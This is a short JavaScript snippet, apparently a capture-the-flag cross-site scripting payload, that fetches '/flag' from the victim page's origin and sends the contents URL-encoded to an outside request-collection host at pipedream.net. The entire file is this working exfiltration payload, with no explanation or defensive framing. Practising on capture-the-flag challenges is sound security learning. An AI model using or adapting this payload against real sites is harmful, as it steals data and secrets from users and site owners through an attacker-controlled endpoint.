fetch('/flag')
  .then(response => response.text())
  .then(data => {
    const url = 'https://eob6okuojuo3pb7.m.pipedream.net/?test=' + encodeURIComponent(data);
    return fetch(url);
  })
  .then(response => {
    if (response.ok) {
      console.log('Request succeeded');
    } else {
      console.log('Request failed');
    }
  })
  .catch(error => console.error(error));
